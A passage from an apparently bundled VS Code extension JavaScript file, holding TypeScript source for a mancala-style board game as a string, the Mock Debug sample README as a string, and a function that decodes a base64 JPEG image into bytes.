	ell.setAttribute('transform','rotate('+dangle+','+cxo+','+cyo+') translate('+tx+','+ty+')');
	return ell;
}

function createSVGInscribedCircle(sq:Square) {
	var circle = document.createElementNS(svgNS,'circle');
	circle.setAttribute('r',(sq.length/2).toString());
	circle.setAttribute('cx',(sq.x+(sq.length/2)).toString());
	circle.setAttribute('cy',(sq.y+(sq.length/2)).toString());
	return circle;
}

export class Position {

	seedCounts:number[];
	startMove:number;
	turn:number;

	constructor(seedCounts:number[],startMove:number,turn:number) {
		this.seedCounts = seedCounts;
		this.startMove = startMove;
		this.turn = turn;
	}

	score() {
		var baseScore = this.seedCounts[storeHouses[1-this.turn]]-this.seedCounts[storeHouses[this.turn]];
		var otherSpaces = homeSpaces[this.turn];
		var sum = 0;
		for (var k = 0,len = otherSpaces.length;k<len;k++) {
			sum += this.seedCounts[otherSpaces[k]];
		}
		if (sum==0) {
			var mySpaces = homeSpaces[1-this.turn];
			var mySum = 0;
			for (var j = 0,len = mySpaces.length;j<len;j++) {
				mySum += this.seedCounts[mySpaces[j]];
			}

			baseScore -= mySum;
		}
		return baseScore;
	}

	move(space:number,nextSeedCounts:number[],features:Features):boolean {
		if ((space==storeHouses[0])||(space==storeHouses[1])) {
			// can't move seeds in storehouse
			return false;
		}
		if (this.seedCounts[space]>0) {
			features.clear();
			var len = this.seedCounts.length;
			for (var i = 0;i<len;i++) {
				nextSeedCounts[i] = this.seedCounts[i];
			}
			var seedCount = this.seedCounts[space];
			nextSeedCounts[space] = 0;
			var nextSpace = (space+1)%14;

			while (seedCount>0) {
				if (nextSpace==storeHouses[this.turn]) {
					features.seedStoredCount++;
				}
				if ((nextSpace!=storeHouses[1-this.turn])) {
					nextSeedCounts[nextSpace]++;
					seedCount--;
				}
				if (seedCount==0) {
					if (nextSpace==storeHouses[this.turn]) {
						features.turnContinues = true;
					}
					else {
						if ((nextSeedCounts[nextSpace]==1)&&
							(nextSpace>=firstHomeSpace[this.turn])&&
							(nextSpace<=lastHomeSpace[this.turn])) {
							// capture
							var capturedSpace = capturedSpaces[nextSpace];
							if (capturedSpace>=0) {
								features.spaceCaptured = capturedSpace;
								features.capturedCount = nextSeedCounts[capturedSpace];
								nextSeedCounts[capturedSpace] = 0;
								nextSeedCounts[storeHouses[this.turn]] += features.capturedCount;
								features.seedStoredCount += nextSeedCounts[capturedSpace];
							}
						}
					}
				}
				nextSpace = (nextSpace+1)%14;
			}
			return true;
		}
		else {
			return false;
		}
	}
}

export class SeedCoords {
	tx:number;
	ty:number;
	angle:number;

	constructor(tx:number, ty:number, angle:number) {
		this.tx = tx;
		this.ty = ty;
		this.angle = angle;
	}
}

export class DisplayPosition extends Position {

	config:SeedCoords[][];

	constructor(seedCounts:number[],startMove:number,turn:number) {
		super(seedCounts,startMove,turn);

		this.config = [];

		for (var i = 0;i<seedCounts.length;i++) {
			this.config[i] = new Array<SeedCoords>();
		}
	}


	seedCircleRect(rect:Rectangle,seedCount:number,board:Element,seed:number) {
		var coords = this.config[seed];
		var sq = rect.inner(0.95).square();
		var cxo = (sq.width/2)+sq.x;
		var cyo = (sq.height/2)+sq.y;
		var seedNumbers = [5,7,9,11];
		var ringIndex = 0;
		var ringRem = seedNumbers[ringIndex];
		var angleDelta = (2*Math.PI)/ringRem;
		var angle = angleDelta;
		var seedLength = sq.width/(seedNumbers.length<<1);
		var crMax = sq.width/2-(seedLength/2);
		var pit = createSVGInscribedCircle(sq);
		if (seed<7) {
			pit.setAttribute('fill','brown');
		}
		else {
			pit.setAttribute('fill','saddlebrown');
		}
		board.appendChild(pit);
		var seedsSeen = 0;
		while (seedCount > 0) {
			if (ringRem == 0) {
				ringIndex++;
				ringRem = seedNumbers[ringIndex];
				angleDelta = (2*Math.PI)/ringRem;
				angle = angleDelta;
			}
			var tx:number;
			var ty:number;
			var tangle = angle;
			if (coords.length>seedsSeen) {
				tx = coords[seedsSeen].tx;
				ty = coords[seedsSeen].ty;
				tangle = coords[seedsSeen].angle;
			}
			else {
				tx = (Math.random()*crMax)-(crMax/3);
				ty = (Math.random()*crMax)-(crMax/3);
				coords[seedsSeen] = new SeedCoords(tx,ty,angle);
			}
			var ell = createSVGEllipsePolar(tangle,seedLength,tx,ty,cxo,cyo);
			board.appendChild(ell);
			angle += angleDelta;
			ringRem--;
			seedCount--;
			seedsSeen++;
		}
	}

	toCircleSVG() {
		var seedDivisions = 14;
		var board = document.createElementNS(svgNS,'svg');
		var boardRect = new Rectangle(0,0,1800,800);
		board.setAttribute('width','1800');
		board.setAttribute('height','800');
		var whole = createSVGRect(boardRect);
		whole.setAttribute('fill','tan');
		board.appendChild(whole);
		var labPlayLab = boardRect.proportionalSplitVert(20,760,20);
		var playSurface = labPlayLab[1];
		var storeMainStore = playSurface.proportionalSplitHoriz(8,48,8);
		var mainPair = storeMainStore[1].subDivideVert(2);
		var playerRects = [mainPair[0].subDivideHoriz(6), mainPair[1].subDivideHoriz(6)];
		// reverse top layer because storehouse on left
		for (var k = 0;k<3;k++) {
			var temp = playerRects[0][k];
			playerRects[0][k] = playerRects[0][5-k];
			playerRects[0][5-k] = temp;
		}
		var storehouses = [storeMainStore[0],storeMainStore[2]];
		var playerSeeds = this.seedCounts.length>>1;
		for (var i = 0;i<2;i++) {
			var player = playerRects[i];
			var storehouse = storehouses[i];
			var r:Rectangle;
			for (var j = 0;j<playerSeeds;j++) {
				var seed = (i*playerSeeds)+j;
				var seedCount = this.seedCounts[seed];
				if (j==(playerSeeds-1)) {
					r = storehouse;
				}
				else {
					r = player[j];
				}
				this.seedCircleRect(r,seedCount,board,seed);
				if (seedCount==0) {
					// clear
					this.config[seed] = new Array<SeedCoords>();
				}
			}
		}
		return board;
	}
}
}
`;
exports.debuggableFile = `# VS Code Mock Debug

This is a starter sample for developing VS Code debug adapters.

**Mock Debug** simulates a debug adapter for Visual Studio Code.
It supports *step*, *continue*, *breakpoints*, *exceptions*, and
*variable access* but it is not connected to any real debugger.

The sample is meant as an educational piece showing how to implement a debug
adapter for VS Code. It can be used as a starting point for developing a real adapter.

More information about how to develop a new debug adapter can be found
[here](https://code.visualstudio.com/docs/extensions/example-debuggers).
Or discuss debug adapters on Gitter:
[![Gitter Chat](https://img.shields.io/badge/chat-online-brightgreen.svg)](https://gitter.im/Microsoft/vscode)

## Using Mock Debug

* Install the **Mock Debug** extension in VS Code.
* Create a new 'program' file 'readme.md' and enter several lines of arbitrary text.
* Switch to the debug viewlet and press the gear dropdown.
* Select the debug environment "Mock Debug".
* Press the green 'play' button to start debugging.

You can now 'step through' the 'readme.md' file, set and hit breakpoints, and run into exceptions (if the word exception appears in a line).

![Mock Debug](images/mock-debug.gif)

## Build and Run

[![build status](https://travis-ci.org/Microsoft/vscode-mock-debug.svg?branch=master)](https://travis-ci.org/Microsoft/vscode-mock-debug)
[![build status](https://ci.appveyor.com/api/projects/status/empmw5q1tk6h1fly/branch/master?svg=true)](https://ci.appveyor.com/project/weinand/vscode-mock-debug)


* Clone the project [https://github.com/Microsoft/vscode-mock-debug.git](https://github.com/Microsoft/vscode-mock-debug.git)
* Open the project folder in VS Code.
* Press 'F5' to build and launch Mock Debug in another VS Code window. In that window:
* Open a new workspace, create a new 'program' file 'readme.md' and enter several lines of arbitrary text.
* Switch to the debug viewlet and press the gear dropdown.
* Select the debug environment "Mock Debug".
* Press 'F5' to start debugging.`;
function getImageFile() {
    const data = atob(`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`);
    return Uint8Array.from([...data].map(x => x.charCodeAt(0)));
}
exports.getImageFile = getImageFile;


/***/ })
/******/ ])));
//# __sourceMappingURL=extension.js.map